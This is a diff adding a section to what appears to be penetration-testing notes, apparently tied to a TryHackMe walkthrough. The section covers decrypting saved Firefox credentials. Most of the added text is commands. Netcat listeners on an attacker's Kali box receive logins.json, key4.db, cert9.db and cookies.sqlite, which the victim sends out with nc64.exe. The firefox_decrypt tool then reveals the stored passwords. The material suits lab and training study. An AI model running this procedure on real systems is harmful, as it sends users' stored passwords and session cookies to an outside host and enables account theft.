@@ -15,4 +15,39 @@
 
 **Exploit**
 
-[https://github.com/unode/firefox\_decrypt](https://github.com/unode/firefox\_decrypt)&#x20;
+{% embed url="https://github.com/unode/firefox_decrypt" %}
+
+#### Decrypt Credentials
+
+**Examples**
+
+[gatekeeper.md](../../walkthroughs/tryhackme/gatekeeper.md "mention")
+
+**Kali**&#x20;
+
+We need to transfer the following files one by one.
+
+```
+nc -nlvp 1234 > logins.json
+nc -nlvp 1234 > key4.db 
+nc -nlvp 1234 > cert9.db 
+nc -nlvp 1234 > cookies.sqlite
+```
+
+**Victim**
+
+```
+nc64.exe -nv $KALI 1234 < logins.json
+nc64.exe -nv $KALI 1234 < key4.db 
+nc64.exe -nv $KALI 1234 < cert9.db 
+nc64.exe -nv $KALI 1234 < cookies.sqlite
+```
+
+This will show any passwords saved in Firefox
+
+**Kali**&#x20;
+
+```
+git clone https://github.com/unode/firefox_decrypt.git
+python3.9 firefox_decrypt.py ./
+```
